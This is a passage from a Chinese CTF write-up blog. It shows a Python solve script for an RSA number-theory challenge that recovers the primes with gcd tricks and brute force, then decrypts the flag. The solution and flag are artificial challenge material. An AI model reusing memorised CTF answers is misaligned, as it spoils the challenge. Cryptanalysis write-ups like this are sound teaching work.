class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">%</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">%</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">运</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">减</span><span class="mord cjk_fallback">少</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">量</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:8.174em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p>
<ul>
<li>得到q之后还要得到p，p的话可以直接遍历<code>2**12</code>到<code>2**13-1</code>的所有素数，直接爆破出q1的系数，然后继续用一次gcd即可得到p</li>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">h0 = <span class="number">3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440</span></span><br><span class="line">n1 = <span class="number">20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561</span></span><br><span class="line">h1 = <span class="number">49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888</span></span><br><span class="line">h2 = <span class="number">56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634</span></span><br><span class="line">n2 = <span class="number">21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057</span></span><br><span class="line">c = <span class="number">5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838</span></span><br><span class="line">q = gmpy2.gcd(h0-<span class="built_in">pow</span>(<span class="number">2024</span>,n1,n1),n1)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">p1 = n1//q</span><br><span class="line"><span class="built_in">print</span>(p1)</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">12</span>,<span class="number">2</span>**<span class="number">13</span>-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i):</span><br><span class="line">        <span class="built_in">list</span>.append(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        p = gmpy2.gcd(h1*i-h2*j,n2)</span><br><span class="line">        <span class="keyword">if</span> p.bit_length()!=<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            <span class="built_in">print</span>(p.bit_length())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> p.bit_length()!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = <span class="number">178557871889789476735392773689039729944728430625818764599203953284194468360955366524476361619864195810267037397001299832526726480560276846147351034417947012223276604383027178163281207815083989579760615671067777036793963045167137767877397560786425871554804100602428308050015870442290953340882348809647523234561</span></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;492aebb6-9c16-4b1a-ac42-fc608bf6063f&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://iyheart.github.io">iyheart</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://iyheart.github.io/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/">http://iyheart.github.io/2024/11/22/CTFblog/write up系列blog/2024年/2024极客大挑战wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://iyheart.github.io" target="_blank">iyheart的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover121.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/ea2e5fb6fbb4c236fbabd387ef83339.jpg" target="_blank"><img class="post-qr-code-img" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/ea2e5fb6fbb4c236fbabd387ef83339.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/11/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/%E6%9D%82%E7%B1%BB/shellcode%E7%BC%96%E5%86%99/" title="shellcode编写"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover86.png" onerror="onerror=null;src='https://raw.githubusercontent.com/iyheart/tuchuang/main/img/f3c2605738aabdeedbc687356fa0e4e5.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">shellcode编写</div></div></a></div><div class="next-post pull-right"><a href="/2024/11/19/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Rust/rust%E5%9F%BA%E7%A1%80/" title="Rust基础"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover120.png" onerror="onerror=null;src='https://raw.githubusercontent.com/iyheart/tuchuang/main/img/f3c2605738aabdeedbc687356fa0e4e5.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Rust基础</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.5tu.cn/uploads/allimg/1910/pic_5tu_big_2019010211653346247.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">iyheart</div><div class="author-info__description">悟已往之不谏，知来者之可追</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">157</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text"> MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2024-%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%98%E8%B5%9B"><span class="toc-number">1.1.</span> <span class="toc-text"> 2024 极客挑战赛！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez_climbstairs"><span class="toc-number">1.2.</span> <span class="toc-text"> ez_climbstairs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez_pcap_1"><span class="toc-number">1.3.</span> <span class="toc-text"> ez_pcap_1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re"><span class="toc-number">2.</span> <span class="toc-text"> RE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hello_re"><span class="toc-number">2.1.</span> <span class="toc-text"> hello_re</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E6%9D%A5%E4%B8%80%E9%81%93%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">2.2.</span> <span class="toc-text"> 先来一道签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A9%E6%88%91%E5%BA%B7%E5%BA%B7%E4%BD%A0%E7%9A%84%E8%B0%83%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text"> 让我康康你的调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E5%8B%92%E4%B8%AAz3%E5%95%8A"><span class="toc-number">2.4.</span> <span class="toc-text"> 我勒个z3啊</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezzzz"><span class="toc-number">2.5.</span> <span class="toc-text"> ezzzz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%BD%E5%83%8F%E6%98%AFpython"><span class="toc-number">2.6.</span> <span class="toc-text"> 好像是python？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B4%9D%E6%96%AF%E8%B4%9D%E6%96%AF"><span class="toc-number">2.7.</span> <span class="toc-text"> 贝斯！贝斯！</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">3.</span> <span class="toc-text"> PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E7%AD%BE%E5%88%B0"><span class="toc-number">3.1.</span> <span class="toc-text"> 简单的签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E4%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%E5%90%97"><span class="toc-number">3.2.</span> <span class="toc-text"> 你会栈溢出吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez_shellcode"><span class="toc-number">3.3.</span> <span class="toc-text"> ez_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#over_flow"><span class="toc-number">3.4.</span> <span class="toc-text"> over_flow？？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00000"><span class="toc-number">3.5.</span> <span class="toc-text"> 00000</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%B0%E9%BB%91%E5%90%97%E5%96%BD%E4%BA%86%E5%90%97"><span class="toc-number">3.6.</span> <span class="toc-text"> 买黑吗喽了吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E7%9A%84%E7%A9%BA%E9%97%B4%E6%9C%89%E7%82%B9%E5%B0%8F%E5%95%8A"><span class="toc-number">3.7.</span> <span class="toc-text"> 这里的空间有点小啊</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8B%8F~~~~"><span class="toc-number">3.8.</span> <span class="toc-text"> 苏~~~~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%9F%E8%83%BD%E8%B5%B0%E5%88%B0%E5%90%8E%E9%97%A8%E5%90%97"><span class="toc-number">3.9.</span> <span class="toc-text"> 真能走到后门吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#orzorw"><span class="toc-number">3.10.</span> <span class="toc-text"> orz?orw!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#findgt"><span class="toc-number">3.11.</span> <span class="toc-text"> FindG???t</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack_overflow"><span class="toc-number">3.12.</span> <span class="toc-text"> stack_overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stdout"><span class="toc-number">3.13.</span> <span class="toc-text"> stdout</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">4.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AF%E6%92%92%E5%8A%A0%E5%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text"> 凯撒加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x0r"><span class="toc-number">4.2.</span> <span class="toc-text"> X0R</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rsa"><span class="toc-number">4.3.</span> <span class="toc-text"> RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ecc"><span class="toc-number">4.4.</span> <span class="toc-text"> ECC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ecbpad"><span class="toc-number">4.5.</span> <span class="toc-text"> ECBpad</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezrsa"><span class="toc-number">4.6.</span> <span class="toc-text"> ezRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc"><span class="toc-number">4.7.</span> <span class="toc-text"> nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dp"><span class="toc-number">4.8.</span> <span class="toc-text"> dp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB"><span class="toc-number">4.9.</span> <span class="toc-text"> 共模攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lll"><span class="toc-number">4.10.</span> <span class="toc-text"> LLL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#number-theory%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.11.</span> <span class="toc-text"> Number theory(复现)</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="PE文件结构">PE文件结构</a><time datetime="2025-08-08T04:10:50.000Z" title="发表于 2025-08-08 12:10:50">2025-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/05/%E6%95%B0%E5%AD%A6blog/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E5%8E%9F%E6%A0%B9%E4%B8%8E%E6%8C%87%E6%A0%87/" title="数论基础-原根与指标">数论基础-原根与指标</a><time datetime="2025-08-05T15:54:31.000Z" title="发表于 2025-08-05 23:54:31">2025-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdin%E4%BB%BB%E6%84%8F%E5%86%99/" title="IO利用之stdin任意写">IO利用之stdin任意写</a><time datetime="2025-07-23T16:45:04.000Z" title="发表于 2025-07-24 00:45:04">2025-07-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/21/%E6%95%B0%E5%AD%A6blog/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%BA%8C%E6%AC%A1%E5%90%8C%E4%BD%99%E5%BC%8F/" title="数论基础-二次同余式与平方剩余">数论基础-二次同余式与平方剩余</a><time datetime="2025-07-21T05:48:27.000Z" title="发表于 2025-07-21 13:48:27">2025-07-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/" title="IO利用之stdout任意读">IO利用之stdout任意读</a><time datetime="2025-07-20T14:02:40.000Z" title="发表于 2025-07-20 22:02:40">2025-07-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By iyheart</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><script src="/zhheo/random.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>